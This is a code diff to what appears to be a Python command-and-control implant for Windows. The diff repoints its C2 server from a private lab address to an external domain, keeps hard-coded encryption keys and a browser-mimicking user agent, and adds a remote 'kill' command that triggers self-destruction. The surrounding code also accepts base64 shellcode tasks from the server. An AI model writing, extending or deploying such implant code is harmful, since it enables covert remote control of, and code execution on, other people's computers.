@@ -39,7 +39,7 @@ from ctypes import wintypes
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://192.168.147.1"
+        self.C2_SERVER = "https://namsos.kornrnune.no/8b7c6"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -1655,6 +1655,17 @@ class Agent:
                     "terminal": True  # This flag helps the server identify terminal output
                 }
             
+            #Kill-pill
+            elif task_type == "kill":
+                self._log_info("[!] Received kill command from C2 - initiating self-destruct")
+                # Use the same self-destruct sequence as killdate
+                self._self_destruct()
+                return {
+                    "status": "success",
+                    "message": "Self-destruct initiated"
+                }
+
+
             elif task_type == "shellcode":
                 try:
                     shellcode_b64 = task.get("data", {}).get("shellcode", "")
